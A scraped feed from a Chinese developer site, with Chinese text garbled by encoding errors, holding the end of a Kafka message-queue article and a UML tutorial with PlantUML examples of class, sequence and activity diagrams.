<p>è™½ç„¶å¤šä¸ª Broker è¿›ç¨‹èƒ½å¤Ÿè¿è¡Œåœ¨åŒä¸€å°æœºå™¨ä¸Šï¼Œä½†æ›´å¸¸è§çš„åšæ³•æ˜¯å°†ä¸åŒçš„ Broker åˆ†æ•£è¿è¡Œåœ¨ä¸åŒçš„æœºå™¨ä¸Šï¼Œè¿™æ ·å¦‚æœé›†ç¾¤ä¸­æŸä¸€å°æœºå™¨å®•æœºï¼Œå³ä½¿åœ¨å®ƒä¸Šé¢è¿è¡Œçš„æ‰€æœ‰ Broker è¿›ç¨‹éƒ½æŒ‚æ‰äº†ï¼Œå…¶ä»–æœºå™¨ä¸Šçš„ Broker ä¹Ÿä¾ç„¶èƒ½å¤Ÿå¯¹å¤–æä¾›æœåŠ¡ã€‚è¿™å…¶å®å°±æ˜¯ Kafka æä¾›é«˜å¯ç”¨çš„æ‰‹æ®µä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-1">ä¸ºä»€ä¹ˆéœ€è¦æ¶ˆæ¯å¼•æ“ç³»ç»Ÿï¼Ÿ</h2>
<p>ç­”æ¡ˆå°±æ˜¯â€œ<strong>å‰Šå³°å¡«è°·</strong>â€ï¼Œä¸Šä¸‹æ¸¸ï¼ˆç”±äºä¸šåŠ¡æ€§è´¨çš„ä¸åŒæ‰€å¯¼è‡´çš„ï¼‰å¤„ç†é€Ÿåº¦ä¸åŒ¹é…ï¼Œæ‰€ä»¥éœ€è¦æ¶ˆæ¯é˜Ÿåˆ—æ¥åšç¼“å†²ã€‚</p>
<p>æ‰€è°“çš„â€œå‰Šå³°å¡«è°·â€å°±æ˜¯æŒ‡ç¼“å†²ä¸Šä¸‹æ¸¸ç¬æ—¶çªå‘æµé‡ï¼Œä½¿å…¶æ›´å¹³æ»‘ã€‚ç‰¹åˆ«æ˜¯å¯¹äºé‚£ç§å‘é€èƒ½åŠ›å¾ˆå¼ºçš„ä¸Šæ¸¸ç³»ç»Ÿï¼Œå¦‚æœæ²¡æœ‰æ¶ˆæ¯å¼•æ“çš„ä¿æŠ¤ï¼Œâ€œè„†å¼±â€çš„ä¸‹æ¸¸ç³»ç»Ÿå¯èƒ½ä¼šç›´æ¥è¢«å‹å®å¯¼è‡´å…¨é“¾è·¯æœåŠ¡â€œé›ªå´©â€ã€‚ä½†æ˜¯ï¼Œä¸€æ—¦æœ‰äº†æ¶ˆæ¯å¼•æ“ï¼Œå®ƒèƒ½å¤Ÿæœ‰æ•ˆåœ°å¯¹æŠ—ä¸Šæ¸¸çš„æµé‡å†²å‡»ï¼ŒçœŸæ­£åšåˆ°å°†ä¸Šæ¸¸çš„â€œå³°â€å¡«æ»¡åˆ°â€œè°·â€ä¸­ï¼Œé¿å…äº†æµé‡çš„éœ‡è¡ã€‚</p>
<p>æ¶ˆæ¯å¼•æ“ç³»ç»Ÿçš„å¦ä¸€å¤§å¥½å¤„åœ¨äºå‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„æ¾è€¦åˆï¼Œè¿™ä¹Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šç®€åŒ–äº†åº”ç”¨çš„å¼€å‘ï¼Œå‡å°‘äº†ç³»ç»Ÿé—´ä¸å¿…è¦çš„äº¤äº’ã€‚
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74d7c33fdee447c58269a0dccb25385f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR29QaWxvdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767944674&amp;x-signature=l2UBblcGI1GbyL9arqOOS7Xf8RA%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[umlå›¾è¯¦ç»†ä»‹ç»]]></title>    <link>https://juejin.cn/post/7590071125398274088</link>    <guid>https://juejin.cn/post/7590071125398274088</guid>    <pubDate>2026-01-02T07:51:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398274088" data-draft-id="7590071125398241320" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="umlå›¾è¯¦ç»†ä»‹ç»"/> <meta itemprop="keywords" content="UML"/> <meta itemprop="datePublished" content="2026-01-02T07:51:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆé‡Œè°¢é¡¿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            umlå›¾è¯¦ç»†ä»‹ç»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆé‡Œè°¢é¡¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:51:21.000Z" title="Fri Jan 02 2026 07:51:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸‹é¢ç”¨ã€Œ<strong>ä¸€å¼ é€ŸæŸ¥è¡¨ + å¤§é‡å¯è¿è¡Œæ¡ˆä¾‹</strong>ã€æŠŠ UML é‡Œ<strong>æœ€å¸¸ç”¨</strong>çš„ä¸‰å¼ å›¾ï¼ˆç±»å›¾ / æ—¶åºå›¾ / æ´»åŠ¨å›¾ï¼‰å½»åº•è®²é€ã€‚<br/>
æ¯ä¸ªæ¡ˆä¾‹éƒ½ç»™å‡º <strong>PlantUML æºç </strong>ï¼Œå¤åˆ¶â†’ç²˜è´´åˆ°<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.planttext.com%2F" target="_blank" title="https://www.planttext.com/" ref="nofollow noopener noreferrer">www.planttext.com/</a> å³å¯ç§’å‡ºé«˜æ¸…çŸ¢é‡å›¾ï¼Œä¹Ÿèƒ½ç›´æ¥åµŒå…¥ Markdown / Confluence / PPTã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€é€ŸæŸ¥è¡¨ï¼š3 å¼ å›¾å„è‡ªè§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h2>





























<table><thead><tr><th>å›¾ç±»å‹</th><th>å›ç­”çš„é—®é¢˜</th><th>æ ¸å¿ƒå…ƒç´ </th><th>è®°å¿†å£è¯€</th></tr></thead><tbody><tr><td><strong>ç±»å›¾</strong>ï¼ˆClass Diagramï¼‰</td><td>ç³»ç»Ÿã€Œ<strong>é•¿ä»€ä¹ˆæ ·</strong>ã€ï¼šæœ‰å“ªäº›ç±»ï¼Ÿå„è‡ªèŒè´£ï¼Ÿç±»ä¹‹é—´æ€ä¹ˆåä½œï¼Ÿ</td><td>ç±»=ä¸‰å±‚æ–¹æ¡†ï¼ˆåå­—-å±æ€§-æ–¹æ³•ï¼‰+ äº”ç§å…³ç³»çº¿</td><td><strong>â€œé™æ€éª¨æ¶â€</strong></td></tr><tr><td><strong>æ—¶åºå›¾</strong>ï¼ˆSequence Diagramï¼‰</td><td>å¯¹è±¡ä¹‹é—´ã€Œ<strong>å…ˆè¯´ä»€ä¹ˆã€åè¯´ä»€ä¹ˆ</strong>ã€ï¼šæ¶ˆæ¯æŒ‰æ—¶é—´é¡ºåºæ€ä¹ˆæµåŠ¨ï¼Ÿ</td><td>ç”Ÿå‘½çº¿+ç®­å¤´è°ƒç”¨+æ¿€æ´»æ¡</td><td><strong>â€œåŠ¨æ€å¯¹è¯â€</strong></td></tr><tr><td><strong>æ´»åŠ¨å›¾</strong>ï¼ˆActivity Diagramï¼‰</td><td>ä¸šåŠ¡æµç¨‹ã€Œ<strong>æ€ä¹ˆèµ°</strong>ã€ï¼šif/elseã€å¹¶å‘ã€å¾ªç¯ã€å¼‚å¸¸æ€ä¹ˆæµè½¬ï¼Ÿ</td><td>åœ†è§’åŠ¨ä½œ+è±å½¢åˆ†æ”¯+é»‘æ£’åŒæ­¥</td><td><strong>â€œæµç¨‹åœ°å›¾â€</strong></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">äºŒã€ç±»å›¾ï¼šé™æ€éª¨æ¶ï¼ˆ7 ä¸ªæ¡ˆä¾‹ï¼‰</h2>
<ol>
<li>ç±»çš„â€œé•¿ä»€ä¹ˆæ ·â€â€”â€”ä¸‰å±‚æ–¹æ¡†</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
class Student {
    -id: Long
    -name: String
    +study()
}
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63cde74969db4f8bac89c4662432db87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=k%2F7BZPt3IknSqaB2KyGgQHSmT4E%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>å…³è”å…³ç³»ï¼šä¸€å¯¹ä¸€ / ä¸€å¯¹å¤š / å¤šå¯¹å¤š</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
class Order {}
class OrderItem {}
class Product {}
Order "1" --&gt; "*" OrderItem : contains
OrderItem "*" --&gt; "1" Product : refers
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/933c695687e04458ae0ca66c1f56e4c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=YLtucLdOJcBgjBXZqunvUQPb8rk%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>èšåˆ VS ç»„åˆï¼šç”Ÿå‘½å‘¨æœŸå¼ºå¼±</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
class Car {}
class Engine {}
class Wheel {}

Car o-- Engine : èšåˆï¼ˆè½¦æŠ¥åºŸå¼•æ“å¯å†ç”¨ï¼‰
Car *-- "4" Wheel : ç»„åˆï¼ˆè½¦é”€æ¯è½®å­ä¹Ÿé”€æ¯ï¼‰
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f1355c5220f40ecbfb7c28a205e702d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=e0LJGt1exWU%2FD4T4i8T%2BhbadCb0%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>ç»§æ‰¿ï¼ˆæ³›åŒ–ï¼‰ï¼ˆæ”¯ä»˜æ¸ é“ä¾‹å­ï¼‰</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
abstract Payment {
    +pay()
}
Payment &lt;|-- Alipay
Payment &lt;|-- WechatPay
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22d5eb7397ff437ca1012509af19011d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=D6zK0M8vQi72FwRYG7ZeDW5VB14%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>å®ç°æ¥å£ï¼ˆJava 8 é»˜è®¤æ–¹æ³•åŒç†ï¼‰</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
interface Flyable {
    +fly()
}
class Bird {}
Flyable &lt;|.. Bird : å®ç°
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b7ef95b4d204ce6b9183e401ba55314~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=HEr%2FkoSDU87SIwtgC8TTbZnYANI%3D" alt="image.png" loading="lazy"/></p>
<ol start="6">
<li>è®¾è®¡æ¨¡å¼ï¼šç­–ç•¥æ¨¡å¼ç±»å›¾</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
interface DiscountStrategy {
    +calc(price: BigDecimal): BigDecimal
}
DiscountStrategy &lt;|-- VipStrategy
DiscountStrategy &lt;|-- CouponStrategy
class OrderContext {
    -strategy: DiscountStrategy
    +execute(price: BigDecimal)
}
OrderContext --&gt; DiscountStrategy : ä½¿ç”¨
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/728f1ea6a07a438e8016577fe13fb49b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=yATaO3v3dZ79hlSR2Szsq4%2B9nR8%3D" alt="image.png" loading="lazy"/></p>
<ol start="7">
<li>SpringBoot ä¸‰å±‚æ¶æ„ï¼ˆControllerâ†’Serviceâ†’DAOï¼‰</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
class UserController {}
interface UserService {}
class UserServiceImpl {}
interface UserRepository {}
class UserRepositoryImpl {}

UserController --&gt; UserService
UserService &lt;|.. UserServiceImpl
UserServiceImpl --&gt; UserRepository
UserRepository &lt;|.. UserRepositoryImpl
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1338039b8b534afdbb9ce13c5e57cff0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=1%2F%2F2KjzF%2FE%2FslrbW9URQGK7osO8%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€æ—¶åºå›¾ï¼šåŠ¨æ€å¯¹è¯ï¼ˆ6 ä¸ªæ¡ˆä¾‹ï¼‰</h2>
<ol>
<li>åŸºç¡€è¯­æ³•ï¼šç”Ÿå‘½çº¿+è°ƒç”¨ç®­å¤´+è¿”å›è™šçº¿</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor Alice
participant Bob
Alice -&gt; Bob: hello()
Bob --&gt; Alice: ok
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85808222eb994167a3f197a38b9b5389~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=GpwDAwFL6YftVuAFpYCeSVvTtxA%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>å¾ªç¯ä¸æ¡ä»¶ï¼ˆç™»å½•é‡è¯• 3 æ¬¡ï¼‰</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor ç”¨æˆ·
participant å‰ç«¯
loop 3 times
    ç”¨æˆ· -&gt; å‰ç«¯: è¾“å…¥å¯†ç 
    alt å¯†ç æ­£ç¡®
        å‰ç«¯ --&gt; ç”¨æˆ·: ç™»å½•æˆåŠŸ
        break
    else å¯†ç é”™è¯¯
        å‰ç«¯ --&gt; ç”¨æˆ·: æç¤ºé‡è¾“
    end
end
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b841296f82f422898f551be5d3e4704~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=7Hf5KfDP%2B6xNb67waFVvStD0MQU%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>å¼‚æ­¥æ¶ˆæ¯ï¼ˆAJAX å›è°ƒï¼‰</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor æµè§ˆå™¨
participant å‰ç«¯JS
participant åç«¯
browser -&gt; å‰ç«¯JS: ç‚¹å‡»æäº¤
å‰ç«¯JS -&gt; åç«¯: POST /api/async
å‰ç«¯JS --&gt; browser: ç«‹å³æ˜¾ç¤ºâ€œå¤„ç†ä¸­â€
åç«¯ -&gt; å‰ç«¯JS: å›è°ƒç»“æœ
å‰ç«¯JS -&gt; browser: æ›´æ–°é¡µé¢
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7b23a5870d04b02b173eb24418e1321~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=g8Z%2FTvX7%2BtjY3Yjrgc%2BSqsdmSc0%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>Redis åˆ†å¸ƒå¼é”å®Œæ•´ç”Ÿå‘½å‘¨æœŸ</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor çº¿ç¨‹
participant Redis
participant MySQL

çº¿ç¨‹ -&gt; Redis: SET lock uuid NX EX 30
alt è¿”å› OK
    çº¿ç¨‹ -&gt; MySQL: SELECT ... FOR UPDATE
    çº¿ç¨‹ -&gt; MySQL: UPDATE ...
    çº¿ç¨‹ -&gt; Redis: DEL lock
else è¿”å› nil
    çº¿ç¨‹ -&gt; çº¿ç¨‹: sleep(0.1)
    çº¿ç¨‹ -&gt; Redis: é‡è¯•
end
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a1935ef553942d59548070f39b6184b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=V2rV6JSzpS5lzO%2FYiU6pbSw9XR8%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>å¾®æœåŠ¡ Feign è°ƒç”¨é“¾ï¼ˆå«ç†”æ–­ï¼‰</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor ç”¨æˆ·
participant OrderService
participant StockService
participant Hystrix

OrderService -&gt; Hystrix: æ‰£åº“å­˜()
Hystrix -&gt; StockService: POST /stock/reduce
alt æˆåŠŸ
    StockService --&gt; Hystrix: 200
else å¤±è´¥ / è¶…æ—¶
    Hystrix --&gt; OrderService: ç†”æ–­è¿”å›fallback
end
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4424bc7f4e9943098069025460f4f038~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=RTFmE5SiBNapw6FEC4JD5soZneM%3D" alt="image.png" loading="lazy"/></p>
<ol start="6">
<li>ä¸‹å•â†’æ”¯ä»˜â†’å±¥çº¦ å…¨æµç¨‹ï¼ˆè·¨ 4 ä¸ªåŸŸï¼‰</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
actor ç”¨æˆ·
boundary ç½‘å…³
control è®¢å•ä¸­å¿ƒ
control æ”¯ä»˜ä¸­å¿ƒ
database MySQL
queue æ¶ˆæ¯é˜Ÿåˆ—
control åº“å­˜ä¸­å¿ƒ

ç”¨æˆ· -&gt; ç½‘å…³: POST /order
ç½‘å…³ -&gt; è®¢å•ä¸­å¿ƒ: createOrder()
è®¢å•ä¸­å¿ƒ -&gt; MySQL: insert
è®¢å•ä¸­å¿ƒ -&gt; æ”¯ä»˜ä¸­å¿ƒ: createPayment()
æ”¯ä»˜ä¸­å¿ƒ -&gt; MySQL: insert
æ”¯ä»˜ä¸­å¿ƒ -&gt; æ¶ˆæ¯é˜Ÿåˆ—: PaymentSuccessäº‹ä»¶
æ¶ˆæ¯é˜Ÿåˆ— -&gt; åº“å­˜ä¸­å¿ƒ: æ‰£åº“å­˜
åº“å­˜ä¸­å¿ƒ -&gt; MySQL: update stock
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e05fcdf8f694743b75656836480ddd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=9j5crj%2FeoLFEEbspsQTIEZWqwMM%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-3">å››ã€æ´»åŠ¨å›¾ï¼šæµç¨‹åœ°å›¾ï¼ˆ5 ä¸ªæ¡ˆä¾‹ï¼‰</h2>
<ol>
<li>åŸºæœ¬åˆ†æ”¯ï¼šç”µå•†ä¸‹å•</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
start
:åˆ›å»ºè®¢å•;
if (åº“å­˜å……è¶³?) then (yes)
    :æ‰£åº“å­˜;
    :æ”¯ä»˜;
    if (æ”¯ä»˜æˆåŠŸ?) then (yes)
        :å‘è´§;
        :å®Œæˆ;
    else (no)
        :å–æ¶ˆè®¢å•;
        :æ¢å¤åº“å­˜;
    endif
else (no)
    :æç¤ºç¼ºè´§;
endif
stop
@enduml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9ab1a2d43404ddb9eec0621fd91f67a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767945081&amp;x-signature=tS0MveUzK2LwzsOo8YTUK5Z3Fdo%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>å¹¶è¡Œï¼ˆFork/Joinï¼‰ï¼šå¤–å–ä¸‹å•åå¹¶è¡Œæµç¨‹</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
start
:ä¸‹å•æˆåŠŸ;
fork
    :å•†å®¶æ¥å•;
fork again
    :éª‘æ‰‹æ¥å•;
fork again
    :ç³»ç»Ÿé€šçŸ¥ç”¨æˆ·;
join
:é…é€ä¸­;
:é€è¾¾;
stop
@enduml
</code></pre>
<ol start="3">
<li>å¾ªç¯ï¼šå®¡æ‰¹é©³å›é‡æ</li>
</ol>
<pre><code class="hljs language-plantuml" lang="plantuml">@startuml
start
repeat
    :å‘˜å·¥æäº¤ç”³è¯·;
    :ç»ç†å®¡æ‰¹;
    if (é€šè¿‡?) then (no)
        :é©³å›ä¿®æ”¹;
    endif
repeat while (æœªé€šè¿‡)
:å½’æ¡£;
stop
@enduml
</code></pre>
